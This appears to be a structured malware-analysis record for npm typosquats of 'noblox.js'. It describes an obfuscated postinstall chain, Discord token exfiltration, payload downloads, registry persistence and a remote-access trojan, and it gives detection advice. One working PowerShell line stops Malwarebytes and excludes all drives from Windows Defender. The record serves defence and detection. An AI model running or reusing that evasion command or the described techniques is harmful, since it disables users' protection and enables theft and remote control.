package_info.package_versions: latest versions as of August 2024 (all versions published by attacker)
package_info.why_malicious: These packages are malicious typosquats of the legitimate 'noblox.js' library, designed to steal sensitive data, establish persistence, evade antivirus, and deploy remote access trojans. They use social engineering (brandjacking, combosquatting, starjacking) to appear legitimate and contain heavily obfuscated postinstall scripts that execute malware.

malicious_snippets.code_snippet: (function(_0x41d81,_0x100026){function ... // heavily obfuscated code with Chinese characters
malicious_snippets.code_behavior: During postinstall, the obfuscated code executes, initiating the malware chain: it downloads and runs additional payloads, disables security software, steals tokens, and establishes persistence.

malice_analysis.why_suspicious: Obfuscated code in a postinstall script is a strong indicator of malicious intent, especially when it is not required for legitimate package setup.
malice_analysis.violated_expectations: Legitimate packages rarely use obfuscation in postinstall scripts and do not perform system-level operations or download executables.
malice_analysis.similar_legitimate_use: Obfuscation may be used for protecting proprietary logic, but not in postinstall scripts.

malicious_snippets.code_behavior: At runtime, the code searches for Discord authentication tokens in local storage, validates them, and exfiltrates valid tokens to a Discord webhook controlled by the attacker.

malice_analysis.why_suspicious: Harvesting and exfiltrating authentication tokens is a classic credential theft technique.
malice_analysis.violated_expectations: Legitimate packages do not access or exfiltrate Discord tokens.
malice_analysis.similar_legitimate_use: None; accessing Discord tokens is not legitimate for npm packages.
key_indicators: Use of Discord webhook for exfiltration

malicious_snippets.code_snippet: if (Get-Service MBAMService -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq 'Running'}) { Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--stopservice" }; (wmic logicaldisk get name).Trim() -split '\n' | Where-Object { $_ -match '^[A-Z]:$' } | ForEach-Object { Add-MpPreference -ExclusionPath $_.Trim() }
malicious_snippets.code_behavior: At runtime, the code attempts to stop Malwarebytes if running and adds all disk drives to Windows Defender's exclusion list, disabling antivirus protection.

malice_analysis.why_suspicious: Disabling security software is a hallmark of malware seeking to evade detection and removal.
malice_analysis.violated_expectations: Legitimate packages do not interact with or disable antivirus software.
malice_analysis.similar_legitimate_use: Rarely, enterprise deployment scripts may adjust AV settings, but never in npm packages.
key_indicators: Adding all drives to Defender exclusion

malicious_snippets.code_behavior: At runtime, the code downloads two executables ('cmd.exe' and 'Client-built.exe') from the attacker's GitHub repository, saving them with randomized names in C:\WindowsApi.

malice_analysis.why_suspicious: Downloading and executing binaries from an external source is a classic malware delivery technique.
malice_analysis.violated_expectations: Legitimate npm packages do not download and execute arbitrary binaries.
malice_analysis.similar_legitimate_use: None in npm packages; only in controlled enterprise deployment scripts.

malicious_snippets.code_behavior: At runtime, the code modifies the Windows registry to set a persistence mechanism: it hijacks the ms-settings Shell Open command to execute the malware whenever the Windows Settings app is opened.

malice_analysis.why_suspicious: Registry hijacking for persistence is a well-known malware tactic.
malice_analysis.violated_expectations: Legitimate packages do not alter registry keys for persistence.

attack_chain.action: User installs malicious npm package, triggering postinstall script.
Obfuscated postinstall script executes, initiating malware chain.
attack_chain.leads_to: Token theft, AV evasion, payload download, persistence

attack_chain.action: Discord tokens are harvested and exfiltrated to attacker's Discord webhook.
Malware disables Malwarebytes and adds all drives to Windows Defender exclusion list.
Malware downloads and executes additional payloads (cmd.exe, Client-built.exe) from attacker's GitHub.
Malware establishes persistence by hijacking Windows Settings registry key.
QuasarRAT is deployed, granting attacker remote control.

behavioral_signatures: Downloading and executing binaries from GitHub
Disabling antivirus services and adding Defender exclusions
detection_knowledge.how_to_detect: Monitor for npm packages with obfuscated postinstall scripts, especially those mimicking popular libraries. Flag any package that accesses Discord token storage, disables antivirus, or downloads executables from external sources. Watch for registry modifications to ms-settings Shell Open command and for network connections to known Discord webhooks or suspicious GitHub repositories.
